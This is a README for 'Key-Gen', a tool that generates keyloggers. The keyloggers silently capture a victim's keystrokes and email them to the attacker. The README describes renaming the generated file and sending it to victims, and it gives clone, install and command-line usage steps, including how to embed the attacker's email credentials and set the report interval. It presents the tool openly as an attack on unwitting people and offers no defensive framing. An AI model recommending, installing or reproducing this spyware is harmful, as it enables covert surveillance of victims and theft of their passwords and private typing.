# Keylogger Generator

**Key-Gen** is a python based-project that enable attacker to generate a specific keylogger software with a uniquet ID on it, the keylogger software contain attackers email credential. means that is capable of send report to the attacker email address.

This Our Keylogger Software will silently captured and record all the keystrokes that the victims types on the targetted machine, and leter on send them to the attacker email. 

# How it Work:
1. An attacker run **Key-Gen** by specifying their email address, password and report interval (in seconds).
2. **Key-Gen** generate a specific keylogger software with a uniquet ID on it.
3. Attacker rename the generated keylogger software and send it to their Victims.
4. Victims mistakely start the keylogger software. BOOM 🎇 Game Over!.
5. Keylogger software send some information to the attacker's email, each time victims connected to their network.


# Our Keylogger Software:

Visit this site [https://github.com/evilfeonix/Key-Gen/More-Details.md](https://github.com/evilfeonix/Key-Gen/moreDetails.md) for detail on **Our Keylogger Software**

# Keylogger Generator Installation
```bash
apt install bash python3
```
```bash
git clone https://github.com/evilfeonix/Key-Gen.git
```
```bash
cd Key-Gen
```
```bash
bash installer.sh
```
```bash
python3 keygen.py
```

# Keylogger Generator Usage
```css
===========================================================
|         _  __                 ____                      |
|        | |/ /___ _   _       / ___| ___ _ __            |
|        | ' // _ \ | | |_____| |  _ / _ \ '_ \           |
|        | . \  __/ |_| |_____| |_| |  __/ | | |          |
|        |_|\_\___|\__, |      \____|\___|_| |_|          |
|          v[1.0]  |___/   Coded By EvilFeonix            |
===========================================================
          
USAGE: python3 keygen.py [Options.. [-e] [-p] [-r]]
    -e      Specify Email Address To Send Report   
    -p      Specify Password Of The Email Address  
    -r      Specify Interval For Sending Report  

Example: python3 keygen.py -e email@domain.tld -p pass1234
Example: python3 keygen.py -e email@domain.tld -p pass1234 -r 600

[!]  Ensure that the report Interval is written in seconds  [!]
[!]            eg.( 600 seconds = 10 minutes)               [!]
===========================================================
```

# Keylogger Generator Sopport:
This our Keylogger Generator Sopport both
- Termux
- Kali-Linux

# Support and Encourage Us:
Follow us on [github.com](https://github.com/evilfeonix)...

Fork, and Star our repositories

Follow us on [facebook.com](https://facebook.com/evilfeonix), [instagram.com](https://instagram.com/evilfeonix), and [youtub.com](https://youtub.com/@3V1LF30N1X) for latest hacking updates.



# License

This project is licensed under the MIT License - see the LICENSE file for details.
